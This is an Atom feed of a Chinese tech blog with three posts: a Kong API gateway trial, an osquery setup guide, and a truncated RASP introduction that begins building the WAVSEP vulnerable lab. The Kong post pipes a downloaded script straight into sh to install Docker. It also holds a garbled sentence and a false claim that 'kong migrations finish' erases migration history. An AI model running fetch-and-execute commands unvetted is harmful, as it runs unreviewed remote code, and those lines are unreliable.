<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>giantbranch&#39;s blog</title>
  
  <subtitle>忘掉掌声，按自己的方式，继续前行，跑过一生</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.giantbranch.cn/"/>
  <updated>2023-11-06T00:50:16.994Z</updated>
  <id>https://www.giantbranch.cn/</id>
  
  <author>
    <name>giantbranch</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>试用Kong</title>
    <link href="https://www.giantbranch.cn/2023/10/29/%E8%AF%95%E7%94%A8Kong/"/>
    <id>https://www.giantbranch.cn/2023/10/29/试用Kong/</id>
    <published>2023-10-29T00:00:00.000Z</published>
    <updated>2023-11-06T00:50:16.994Z</updated>
    
    <content type="html"><![CDATA[<p>Kong是一个基于Nginx的API网关和微服务管理平台。它提供了一组高级功能，例如请求路由、负载均衡、认证、监控和分析等，以帮助开发人员更轻松地构建和管理微服务架构。</p><p>更确切地说，Kong是一个在Nginx中运行的Lua应用程序，并且可以通过lua-nginx模块实现。Kong不是用这个模块编译Nginx，而是与OpenResty一起分发，OpenResty已经包含了lua-nginx-module。OpenResty不是Nginx的分支，而是一组扩展其功能的模块。</p><p>这为可插拔架构奠定了基础，可以在运行时启用和执行Lua脚本（称为“插件”）。 因此，我们认为Kong是微服务架构的典范：它的核心是实现数据库抽象，路由和插件管理。 插件可以存在于单独的代码库中，并且可以在几行代码中注入到请求生命周期的任何位置。</p><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>安装docker和docker-compose</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Install the latest version docker</span><br><span class="line">curl -s https://get.docker.com/ | sh</span><br><span class="line"># Install docker compose</span><br><span class="line">curl -SL https://github.com/docker/compose/releases/download/v2.23.0/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>克隆仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Kong/docker-kong</span><br><span class="line">cd docker-kong/compose/</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">KONG_DATABASE=postgres docker-compose --profile database up</span><br></pre></td></tr></table></figure><p>如果没报错，可以加-d后台运行</p><p>我们可以查看下<code>https://github.com/Kong/docker-kong/blob/master/compose/docker-compose.yml</code></p><p>看看docker里面启动了什么容器</p><p>这个Compose文件定义了三个服务：kong-migrations、kong-migrations-up和kong</p><h2 id="kong-migrations"><a href="#kong-migrations" class="headerlink" title="kong-migrations"></a>kong-migrations</h2><p>kong-migrations服务用于执行Kong数据库迁移的初始化操作。该服务的命令为<code>kong migrations bootstrap</code>，这个服务依赖于一个名为db的服务，表示它需要在db服务启动之后才能启动。此外，它还引用了一个名为kong_postgres_password的密钥，用于访问PostgreSQL数据库。该服务使用了名为kong-net的网络，并在失败时重新启动。</p><blockquote><p>kong migrations bootstrap 命令是Kong在首次数据库初始化时使用的。</p><ol><li>创建所需的数据库表</li></ol><p>Kong需要一些核心表来存储配置数据,如kong.apis、kong.consumers等。bootstrap会根据数据库类型(Postgres/Cassandra)来创建并初始化这些核心表。</p><ol start="2"><li>创建кong_migrations表</li></ol><p>kong_migrations表用于记录已经运行的数据库迁移脚本版本。这Ensure the initial database schema宷一个&gt; 初始化的数据库结构。</p><ol start="3"><li>插入初始记录 </li></ol><p>会插入一些必须的初始数据,如设置表primary key等。</p><ol start="4"><li>标记为执行完成</li></ol><p>在kong_migrations表中插入一条执行记录,标记bootstrap已经完成。</p><p>所以在Kong首次使用一个空数据库时,需要先执行bootstrap建立初始表结构,然后才能使用kong migrations &gt; &gt; up执行后续的数据库升级。</p><p>与直接使用up命令不同,bootstrap专门用于初始化一个空数据库。执行成功后,该数据库即可用于启动Kong。</p></blockquote><h2 id="kong-migrations-up"><a href="#kong-migrations-up" class="headerlink" title="kong-migrations-up"></a>kong-migrations-up</h2><p>kong-migrations-up服务与kong-migrations服务类似，kong migrations up 和 kong migrations finish 这两个命令是Kong在数据库初始化和升级时使用的。</p><blockquote><p>kong migrations up:</p><ul><li><p>这个命令会运行所有未应用的数据库迁移脚本,以将Kong的数据库schema更新到最新版本。 </p></li><li><p>Kong的数据库脚本存放在kong/migrations/目录下,每次Kong版本升级都会添加新的迁移脚本。</p></li><li><p>kong migrations up会按文件名顺序运行新增的迁移脚本,以分阶段地更新数据库结构。</p></li></ul></blockquote><blockquote><p>kong migrations finish:</p><ul><li><p>在所有迁移脚本运行完成后,这个命令将会删除kong_migrations表中记录的所有迁移历史。</p></li><li><p>kong_migrations表中存放了已运行迁移脚本的记录,用于判断尚未运行的脚本。</p></li><li><p>finish命令清除历史后,后续再次运行kong migrations up时会从头开始运行所有脚本。</p></li></ul></blockquote><p>所以这两个命令组合可以完成Kong数据库的初始化更新。</p><ul><li>kong migrations up带来所有新脚本变更</li><li>kong migrations finish重置运行历史</li></ul><p>每次Kong版本升级都需要运行这两个命令,以更新数据库结构。</p><h2 id="kong服务"><a href="#kong服务" class="headerlink" title="kong服务"></a>kong服务</h2><p>kong服务才是主要的Kong运行实例，是Kong网关的主要服务。</p><p>它使用了与前两个服务相同的Docker镜像，并可以通过环境变量${KONG_USER}指定运行用户，默认为kong。该服务配置了多个环境变量，包括Kong的管理员访问日志、代理访问日志、Kong的监听地址和端口等。它也引用了kong_postgres_password密钥，并使用了相同的网络和重新启动策略。此外，它还暴露了一些端口，包括代理监听端口、管理员监听端口以及Kong的Web管理界面监听端口。这些端口可以通过环境变量进行配置。该服务还定义了一个健康检查，每10秒执行一次kong health命令来检查服务的健康状态。它还将容器设置为只读模式，并挂载了一些卷用于存储Kong的运行数据和配置文件。最后，kong服务还设置了一个名为no-new-privileges的安全选项，用于禁止容器在运行时获取新的特权。</p><p>上面文件监听如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0:8000</span><br><span class="line">127.0.0.1:8001 </span><br><span class="line">127.0.0.1:8002 </span><br><span class="line">0.0.0.0:8443   </span><br><span class="line">127.0.0.1:8444</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># netstat -antp | grep docker-proxy</span><br><span class="line">tcp        0      0 0.0.0.0:8443            0.0.0.0:*               LISTEN      28466/docker-proxy  </span><br><span class="line">tcp        0      0 127.0.0.1:8444          0.0.0.0:*               LISTEN      28385/docker-proxy  </span><br><span class="line">tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      28639/docker-proxy  </span><br><span class="line">tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      28602/docker-proxy  </span><br><span class="line">tcp        0      0 127.0.0.1:8002          0.0.0.0:*               LISTEN      28550/docker-proxy</span><br></pre></td></tr></table></figure><p>8000    就是Kong的转发流量的端口<br>8001    使用 Admin API 或通过 decK 配置 Kong<br>8002    访问 Kong 的管理 Web UI （ Kong Manager）</p><p><a href="https://docs.konghq.com/gateway/latest/get-started/services-and-routes/" target="_blank" rel="noopener">https://docs.konghq.com/gateway/latest/get-started/services-and-routes/</a></p><p>其实假如将监听改为0.0.0.0会更加方便实践，在生产环境应该不建议这么做了</p><h1 id="api测试用例"><a href="#api测试用例" class="headerlink" title="api测试用例"></a>api测试用例</h1><p>用python flask写了简单的api示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># cat app.py </span><br><span class="line">from flask import Flask, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># 假设这是一个存储在数据库中的用户数据列表</span><br><span class="line">users = [</span><br><span class="line">    &#123;&apos;id&apos;: 1, &apos;name&apos;: &apos;Alice&apos;&#125;,</span><br><span class="line">    &#123;&apos;id&apos;: 2, &apos;name&apos;: &apos;Bob&apos;&#125;,</span><br><span class="line">    &#123;&apos;id&apos;: 3, &apos;name&apos;: &apos;Charlie&apos;&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/users/&lt;int:user_id&gt;&apos;)</span><br><span class="line">def get_user(user_id):</span><br><span class="line">    for user in users:</span><br><span class="line">        if user[&apos;id&apos;] == user_id:</span><br><span class="line">            return jsonify(&#123;&apos;id&apos;: user[&apos;id&apos;], &apos;name&apos;: user[&apos;name&apos;]&#125;)</span><br><span class="line">    return jsonify(&#123;&apos;error&apos;: &apos;User not found&apos;&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=808)</span><br></pre></td></tr></table></figure><p>测试没问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# curl http://192.168.145.131:808/users/1</span><br><span class="line">&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Alice&quot;&#125;</span><br></pre></td></tr></table></figure><h1 id="配置转发"><a href="#配置转发" class="headerlink" title="配置转发"></a>配置转发</h1><ol><li>新建服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu2004:~/python-api# curl -i -s -X POST http://localhost:8001/services \</span><br><span class="line">&gt;  --data name=flask-api \</span><br><span class="line">&gt;  --data url=&apos;http://192.168.145.131:808&apos;</span><br><span class="line">HTTP/1.1 201 Created</span><br><span class="line">Date: Sun, 05 Nov 2023 12:28:36 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Content-Length: 375</span><br><span class="line">X-Kong-Admin-Latency: 4054</span><br><span class="line">Server: kong/3.4.2</span><br><span class="line"></span><br><span class="line">&#123;&quot;enabled&quot;:true,&quot;write_timeout&quot;:60000,&quot;tls_verify&quot;:null,&quot;tls_verify_depth&quot;:null,&quot;retries&quot;:5,&quot;protocol&quot;:&quot;http&quot;,&quot;updated_at&quot;:1699187312,&quot;port&quot;:808,&quot;client_certificate&quot;:null,&quot;tags&quot;:null,&quot;path&quot;:null,&quot;id&quot;:&quot;3bb09dda-db8a-4587-bd0f-9cd9607f636d&quot;,&quot;connect_timeout&quot;:60000,&quot;read_timeout&quot;:60000,&quot;ca_certificates&quot;:null,&quot;host&quot;:&quot;192.168.145.131&quot;,&quot;created_at&quot;:1699187312,&quot;name&quot;:&quot;flask-api&quot;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>创建路由</li></ol><p>/flasktest的的流量定向到之前创建的 flask-api 服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu2004:~/python-api# curl -i -X POST http://localhost:8001/services/flask-api/routes \</span><br><span class="line">&gt;   --data &apos;paths[]=/flasktest&apos; \</span><br><span class="line">&gt;   --data name=flask-route</span><br><span class="line">HTTP/1.1 201 Created</span><br><span class="line">Date: Sun, 05 Nov 2023 12:33:41 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Content-Length: 488</span><br><span class="line">X-Kong-Admin-Latency: 16</span><br><span class="line">Server: kong/3.4.2</span><br><span class="line"></span><br><span class="line">&#123;&quot;path_handling&quot;:&quot;v0&quot;,&quot;https_redirect_status_code&quot;:426,&quot;methods&quot;:null,&quot;sources&quot;:null,&quot;destinations&quot;:null,&quot;created_at&quot;:1699187621,&quot;protocols&quot;:[&quot;http&quot;,&quot;https&quot;],&quot;regex_priority&quot;:0,&quot;service&quot;:&#123;&quot;id&quot;:&quot;3bb09dda-db8a-4587-bd0f-9cd9607f636d&quot;&#125;,&quot;headers&quot;:null,&quot;tags&quot;:null,&quot;snis&quot;:null,&quot;preserve_host&quot;:false,&quot;paths&quot;:[&quot;/flasktest&quot;],&quot;id&quot;:&quot;ec442942-4857-44c1-8462-0aca41717cf2&quot;,&quot;strip_path&quot;:true,&quot;updated_at&quot;:1699187621,&quot;hosts&quot;:null,&quot;request_buffering&quot;:true,&quot;response_buffering&quot;:true,&quot;name&quot;:&quot;flask-route&quot;&#125;</span><br></pre></td></tr></table></figure><p>现在我们访问，就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu2004:~/python-api# curl http://192.168.145.131:8000/flasktest/users/1</span><br><span class="line">&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Alice&quot;&#125;</span><br></pre></td></tr></table></figure><p>当然也可以在8002端口的web界面进行设置</p><p><img src="http://pic.giantbranch.cn/pic/1699188005278.png" alt></p><h1 id="复杂均衡"><a href="#复杂均衡" class="headerlink" title="复杂均衡"></a>复杂均衡</h1><ol><li>创建upstream </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8001/upstreams \</span><br><span class="line"> --data name=example_upstream</span><br></pre></td></tr></table></figure><ol start="2"><li>创建负载均衡目标</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8001/upstreams/example_upstream/targets \</span><br><span class="line"> --data target=&apos;mockbin.org:80&apos;</span><br><span class="line">curl -X POST http://localhost:8001/upstreams/example_upstream/targets \</span><br><span class="line"> --data target=&apos;httpbin.org:80&apos;</span><br></pre></td></tr></table></figure><ol start="3"><li>Update the service 更新服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PATCH http://localhost:8001/services/example_service \</span><br><span class="line">  --data host=&apos;example_upstream&apos;</span><br></pre></td></tr></table></figure><ol start="4"><li>验证</li></ol><p>多次访问查看host的变化在mockbin和httpbin 之间更改就是配置成功了（注：mock路径是之前官方文档创建的路由）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://localhost:8000/mock/headers |grep -i -A1 &apos;&quot;host&quot;&apos;</span><br></pre></td></tr></table></figure><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p>插件那里有一些安全插件、流量控制的东西，这种东西自己搞可能就比较费劲了</p><p>当然还有代理缓存</p><p><img src="http://pic.giantbranch.cn/pic/1699188063514.png" alt></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/Kong/kong" target="_blank" rel="noopener">https://github.com/Kong/kong</a></p><p><a href="https://docs.konghq.com/gateway/latest/get-started/services-and-routes/" target="_blank" rel="noopener">https://docs.konghq.com/gateway/latest/get-started/services-and-routes/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Kong是一个基于Nginx的API网关和微服务管理平台。它提供了一组高级功能，例如请求路由、负载均衡、认证、监控和分析等，以帮助开发人员更轻松地构建和管理微服务架构。&lt;/p&gt;
&lt;p&gt;更确切地说，Kong是一个在Nginx中运行的Lua应用程序，并且可以通过lua-ngin
      
    
    </summary>
    
    
      <category term="Kong" scheme="https://www.giantbranch.cn/tags/Kong/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu安装osquery试用</title>
    <link href="https://www.giantbranch.cn/2023/10/15/Ubuntu%E5%AE%89%E8%A3%85osquery%E8%AF%95%E7%94%A8/"/>
    <id>https://www.giantbranch.cn/2023/10/15/Ubuntu安装osquery试用/</id>
    <published>2023-10-15T00:00:00.000Z</published>
    <updated>2023-11-06T00:56:22.343Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>实验环境</p><blockquote><p>Ubuntu 16.04</p></blockquote><p>根据官网，debian系使用如下命令安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/apt/keyrings</span><br><span class="line">curl -L https://pkg.osquery.io/deb/pubkey.gpg | sudo tee /etc/apt/keyrings/osquery.asc</span><br><span class="line">sudo add-apt-repository &apos;deb [arch=amd64 signed-by=/etc/apt/keyrings/osquery.asc] https://pkg.osquery.io/deb deb main&apos;</span><br><span class="line">sudo apt install osquery</span><br></pre></td></tr></table></figure><p>add-apt-repository出问题，报错invalid</p><p>手动添加到sources.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">deb [arch=amd64] https://pkg.osquery.io/deb deb main</span><br></pre></td></tr></table></figure><p>apt update，报错NO_PUBKEY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The following signatures couldn&apos;t be verified because the public key is not available: NO_PUBKEY 97A80C63C9D8B80B</span><br></pre></td></tr></table></figure><p>我们添加以下：（97A80C63C9D8B80B根据上面报错修改）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 97A80C63C9D8B80B</span><br></pre></td></tr></table></figure><p>再执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install osquery</span><br></pre></td></tr></table></figure><h1 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h1><p>先手动启动看看有无报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# osqueryd </span><br><span class="line">W1018 07:21:11.436761  5261 init.cpp:760] Error reading config: config file does not exist: /etc/osquery/osquery.conf</span><br><span class="line">I1018 07:21:11.436888  5261 eventfactory.cpp:156] Event publisher not enabled: BPFEventPublisher: Publisher disabled via configuration</span><br><span class="line">I1018 07:21:11.436990  5261 eventfactory.cpp:156] Event publisher not enabled: auditeventpublisher: Publisher disabled via configuration</span><br><span class="line">I1018 07:21:11.437004  5261 eventfactory.cpp:156] Event publisher not enabled: inotify: Publisher disabled via configuration</span><br><span class="line">I1018 07:21:11.437013  5261 eventfactory.cpp:156] Event publisher not enabled: syslog: Publisher disabled via configuration</span><br></pre></td></tr></table></figure><p>发现少了conf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /opt/osquery/share/osquery/osquery.example.conf /etc/osquery/osquery.conf</span><br></pre></td></tr></table></figure><p>之后就可以启动啦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# osqueryctl restart</span><br><span class="line">root@ubuntu:~# osqueryctl status</span><br><span class="line">● osqueryd.service - The osquery Daemon</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/osqueryd.service; disabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since Wed 2023-10-18 07:23:06 PDT; 3s ago</span><br><span class="line">  Process: 5740 ExecStartPre=/bin/sh -c if [ -f $LOCAL_PIDFILE ]; then mv $LOCAL_PIDFILE $PIDFILE; fi (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 5729 ExecStartPre=/bin/sh -c if [ ! -f $FLAG_FILE ]; then touch $FLAG_FILE; fi (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 5743 (osqueryd)</span><br><span class="line">    Tasks: 14</span><br><span class="line">   Memory: 14.9M</span><br><span class="line">      CPU: 79ms</span><br><span class="line">   CGroup: /system.slice/osqueryd.service</span><br><span class="line">           ├─5743 /opt/osquery/bin/osqueryd --flagfile /etc/osquery/osquery.flags --config_path /etc/osquery/osquery.conf</span><br><span class="line">           └─5750 /opt/osquery/bin/osqueryd                                                                              </span><br><span class="line"></span><br><span class="line">Oct 18 07:23:06 ubuntu systemd[1]: Starting The osquery Daemon...</span><br><span class="line">Oct 18 07:23:06 ubuntu systemd[1]: Started The osquery Daemon.</span><br><span class="line">Oct 18 07:23:06 ubuntu osqueryd[5743]: osqueryd started [version=5.9.1]</span><br><span class="line">Oct 18 07:23:06 ubuntu osqueryd[5743]: I1018 07:23:06.520910  5750 eventfactory.cpp:156] Event publisher not enabled: BPFEventPublisher: Publisher disabled via configuratio</span><br><span class="line">Oct 18 07:23:06 ubuntu osqueryd[5743]: I1018 07:23:06.571094  5750 eventfactory.cpp:156] Event publisher not enabled: auditeventpublisher: Publisher disabled via configurat</span><br><span class="line">Oct 18 07:23:06 ubuntu osqueryd[5743]: I1018 07:23:06.571115  5750 eventfactory.cpp:156] Event publisher not enabled: inotify: Publisher disabled via configuration</span><br><span class="line">Oct 18 07:23:06 ubuntu osqueryd[5743]: I1018 07:23:06.571126  5750 eventfactory.cpp:156] Event publisher not enabled: syslog: Publisher disabled via configuration</span><br></pre></td></tr></table></figure><h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><p>输入osqueryi即可开始查询</p><p>查询用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users;</span><br></pre></td></tr></table></figure><p>查询shell登录的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM logged_in_users;</span><br></pre></td></tr></table></figure><p>端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM listening_ports;</span><br><span class="line">SELECT * FROM listening_ports WHERE port=3389;</span><br></pre></td></tr></table></figure><p>内核模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from kernel_modules;</span><br></pre></td></tr></table></figure><p>更多的表和结构可以查看</p><p><a href="https://osquery.io/schema/5.9.1/" target="_blank" rel="noopener">https://osquery.io/schema/5.9.1/</a></p><p>页面可以选择osquery的版本</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;p&gt;实验环境&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ubuntu 16.04&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;根据官网，debian
      
    
    </summary>
    
    
      <category term="osquery" scheme="https://www.giantbranch.cn/tags/osquery/"/>
    
  </entry>
  
  <entry>
    <title>应用实时防护（RASP）</title>
    <link href="https://www.giantbranch.cn/2023/10/11/%E5%BA%94%E7%94%A8%E5%AE%9E%E6%97%B6%E9%98%B2%E6%8A%A4%EF%BC%88RASP%EF%BC%89/"/>
    <id>https://www.giantbranch.cn/2023/10/11/应用实时防护（RASP）/</id>
    <published>2023-10-11T00:00:00.000Z</published>
    <updated>2023-11-06T00:50:17.886Z</updated>
    
    <content type="html"><![CDATA[<p>应用实时防护（RASP）是一种现代的应用安全技术，它的原理是在应用程序运行时动态分析和监视应用程序的行为，以侦测和防止潜在的应用安全漏洞和攻击。RASP 技术通常被集成到应用程序代码中或应用程序服务器中，以实现实时的安全保护。以下是 RASP 技术的一般原理：</p><ol><li><p><strong>应用程序内嵌</strong>：RASP 技术通常以库或模块的形式嵌入到应用程序中，可以在应用程序的运行时启用和运行。这允许 RASP 技术深入了解应用程序的内部结构和行为。</p></li><li><p><strong>实时监视</strong>：RASP 技术实时监视应用程序的执行。它跟踪应用程序的输入、输出、内部函数调用和数据流动等活动。</p></li><li><p><strong>上下文感知</strong>：RASP 技术了解应用程序的上下文，包括用户、数据、环境和网络连接等。这有助于它更好地评估应用程序行为的合法性。</p></li><li><p><strong>行为分析</strong>：RASP 技术对应用程序的行为进行分析，以检测不寻常的活动和潜在的攻击模式。它使用基于规则和机器学习等技术来进行分析。</p></li><li><p><strong>攻击检测</strong>：RASP 技术识别和检测各种应用安全威胁，如 SQL 注入、跨站脚本（XSS）、跨站请求伪造（CSRF）等。</p></li><li><p><strong>实时响应</strong>：当 RASP 技术检测到潜在的威胁时，它可以采取多种行动，包括拒绝请求、阻止攻击、记录事件、生成警报或采取其他安全响应措施。</p></li><li><p><strong>自我保护</strong>：RASP 技术还可以自我保护，意味着它会尽力保护自身免受恶意攻击或尝试绕过它的行为。</p></li><li><p><strong>安全策略配置</strong>：RASP 技术通常允许管理员配置安全策略，以适应不同的应用程序需求和威胁模式。这包括定义哪些行为是允许的，哪些是禁止的，以及如何响应各种威胁。</p></li></ol><p>总的来说，RASP 技术通过深入了解应用程序的内部运行时行为，实时监视和分析应用程序活动，以检测和防止潜在的应用安全漏洞和攻击。这有助于应用程序更好地自我保护并提供实时的安全防护。但需要注意，RASP 技术通常不是独立的安全解决方案，而应与其他安全控制（如WAF、IDS/IPS等）一起使用，以建立更全面的安全防御体系。</p><h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><p>实验环境</p><blockquote><p>Ubuntu 16.04<br>tomcat 7</p></blockquote><p>以java为例的，WAVSEP的漏洞靶场</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sectooladdict/wavsep/releases/tag/wavsep-v1.5-war</span><br></pre></td></tr></table></figure><p>首先安装Tomcat环境、mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install tomcat7 tomcat7-admin mysql-server</span><br></pre></td></tr></table></figure><p>mysql可能需要修改root密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root</span><br><span class="line">use mysql;</span><br><span class="line">ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED WITH mysql_native_password BY &apos;新密码&apos;;</span><br></pre></td></tr></table></figure><p>编辑tomcat配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu2004:/etc/tomcat7# vim tomcat-users.xml </span><br><span class="line">root@ubuntu2004:/etc/tomcat7# service tomcat9 restart</span><br></pre></td></tr></table></figure><p>添加内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;tomcat&quot; password=&quot;XXXX&quot; roles=&quot;manager-gui&quot;/&gt;</span><br></pre></td></tr></table></figure><p>创建数据库目录y</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 